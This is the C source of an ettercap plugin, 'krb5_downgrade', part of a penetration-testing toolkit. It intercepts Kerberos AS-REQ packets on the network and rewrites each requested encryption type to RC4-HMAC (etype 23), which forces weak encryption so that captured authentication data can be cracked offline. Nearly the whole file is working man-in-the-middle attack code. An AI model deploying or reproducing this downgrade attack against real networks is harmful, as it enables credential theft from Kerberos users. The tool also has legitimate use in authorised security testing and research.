/*
    krb5_downgrade -- ettercap plugin - Downgrades Kerberos V5 security by
    modifying AS-REQ packets

    Copyright (C) Dhiru Kholia (dhiru at openwall.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

    This file borrows boilerplate code from the smb_down plugin.
 */

#include <ec.h>
#include <ec_plugins.h>
#include <ec_packet.h>
#include <ec_hook.h>
#include <ec_asn1.h>

/* https://cwiki.apache.org/confluence/display/DIRxASN1/Kerberos

   KDC-REQ         ::= SEQUENCE {
        -- NOTE: first tag is [1], not [0]
        pvno            [1] INTEGER (5) ,
        msg-type        [2] INTEGER (10 -- AS -- | 12 -- TGS --),
        padata          [3] SEQUENCE OF PA-DATA OPTIONAL
                            -- NOTE: not empty --,
        req-body        [4] KDC-REQ-BODY
   }

   KDC-REQ-BODY    ::= SEQUENCE {
        kdc-options             [0] KDCOptions,
        cname                   [1] PrincipalName OPTIONAL
                                    -- Used only in AS-REQ --,
        realm                   [2] Realm
                                    -- Server's realm
                                    -- Also client's in AS-REQ --,
        sname                   [3] PrincipalName OPTIONAL,
        from                    [4] KerberosTime OPTIONAL,
        till                    [5] KerberosTime,
        rtime                   [6] KerberosTime OPTIONAL,
        nonce                   [7] UInt32,
        etype                   [8] SEQUENCE OF Int32 -- EncryptionType
                                    -- in preference order --,
        addresses               [9] HostAddresses OPTIONAL,
        enc-authorization-data  [10] EncryptedData OPTIONAL
                                    -- AuthorizationData --,
        additional-tickets      [11] SEQUENCE OF Ticket OPTIONAL
                                        -- NOTE: not empty
   }

   AS-REQ          ::= [APPLICATION 10] KDC-REQ */

/* protos */
int plugin_load(void *);
static int krb5_downgrade_init(void *);
static int krb5_downgrade_fini(void *);
static int krb5_downgrade_unload(void *);

static void parse_krb5(struct packet_object *po);

/* plugin operations */

struct plugin_ops krb5_downgrade_ops = {
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version = EC_VERSION,
   /* the name of the plugin */
   .name = "krb5_downgrade",
   /* a short description of the plugin */
   .info = "Downgrades Kerberos V5 security by modifying AS-REQ packets",
   /* the plugin version. */
   .version = "1.0",
   /* activation function */
   .init = &krb5_downgrade_init,
   /* deactivation function */
   .fini = &krb5_downgrade_fini,
   /* clean-up function */
   .unload = &krb5_downgrade_unload,
};

int plugin_load(void *handle)
{
   return plugin_register(handle, &krb5_downgrade_ops);
}

static int krb5_downgrade_init(void *dummy)
{
   /* variable not used */
   (void)dummy;

   /* It doesn't work if unoffensive */
   if (EC_GBL_OPTIONS->unoffensive) {
      INSTANT_USER_MSG("krb5_downgrade: plugin doesn't work in UNOFFENSIVE mode\n");
      return PLUGIN_FINISHED;
   }

   USER_MSG("krb5_downgrade: plugin running...\n");

   hook_add(HOOK_PROTO_KRB5, &parse_krb5);
   return PLUGIN_RUNNING;
}

static int krb5_downgrade_fini(void *dummy)
{
   /* variable not used */
   (void)dummy;

   USER_MSG("krb5_downgrade: plugin terminated...\n");

   hook_del(HOOK_PROTO_KRB5, &parse_krb5);
   return PLUGIN_FINISHED;
}

static int krb5_downgrade_unload(void *dummy)
{
   /* variable not used */
   (void)dummy;

   return PLUGIN_UNLOADED;
}



/* Downgrade the "etype" values present in AS-REQ request */
static void parse_krb5(struct packet_object *po)
{
   u_char *ptr;
   ptr = po->DATA.data;
   struct asn1_hdr hdr;
   size_t length = po->DATA.len;
   size_t size, netypes, i;
   uint8_t *pos, *end;
   int ret;
   int found = 0;
   char tmp[MAX_ASCII_ADDR_LEN];

   pos = ptr;
   // APPLICATION 10, look for AS-REQ packets
   if (asn1_get_next(pos, length, &hdr) < 0 || hdr.class != ASN1_CLASS_APPLICATION || hdr.tag != 10) {
      // Hack to skip over "Record Mark"
      pos = pos + 4;
      if (asn1_get_next(pos, length, &hdr) < 0 || hdr.class != ASN1_CLASS_APPLICATION || hdr.tag != 10) {
         return;
      }
   }
   pos = hdr.payload;
   end = pos + hdr.length;

   if (end > pos + length)
      return;

   // KDC-REQ SEQUENCE
   if (asn1_get_next(pos, end - pos, &hdr) < 0 || hdr.class != ASN1_CLASS_UNIVERSAL || hdr.tag != ASN1_TAG_SEQUENCE) {
      return;
   }
   pos = hdr.payload;

   // Locate KDC-REQ-BODY (class = 2, tag = 4)
   while (1) {
      if (end <= pos)
         return;
      ret = asn1_get_next(pos, end - pos, &hdr);
      if (ret < 0)
         return;
      if (hdr.class == 2 && hdr.tag == 4) {
         found = 1;
         break;
      }
      pos = hdr.payload + hdr.length;
   }
   if (!found)
      return;

   // KDC-REQ-BODY SEQUENCE
   pos = hdr.payload;
   ret = asn1_get_next(pos, end - pos, &hdr);
   pos = hdr.payload;

   // Locate etype (class = 2, tag = 8)
   found = 0;
   while (1) {
      if (end <= pos)
         return;
      ret = asn1_get_next(pos, end - pos, &hdr);
      if (ret < 0)
         return;
      if (hdr.class == 2 && hdr.tag == 8) {
         found = 1;
         break;
      }
      pos = hdr.payload + hdr.length;
   }
   if (!found)
      return;

   // SEQUENCE OF Int32 -- EncryptionType -- in preference order --
   pos = hdr.payload;
   size = pos[1];
   netypes = pos[1] / 3;
   if (pos + size > ptr + length)
      return;

   // Sample etype records -> 02 01 12, 02 01 11, 02 01 10, 02 01 17.
   // Downgrade the etypes to etype 23.
   pos = pos + 2; // pointing to first etype record
   for (i = 0; i < netypes; i++) {
      pos[2] = '\x17';
      pos = pos + 3;
      po->flags |= PO_MODIFIED;
   }
   if (po->flags & PO_MODIFIED) {
      USER_MSG("krb5_downgrade: Downgraded etypes in AS-REQ message, %s -> ", ip_addr_ntoa(&po->L3.src, tmp));
      USER_MSG("%s\n", ip_addr_ntoa(&po->L3.dst, tmp));
   }
}

/* EOF */

// vim:ts=3:expandtab
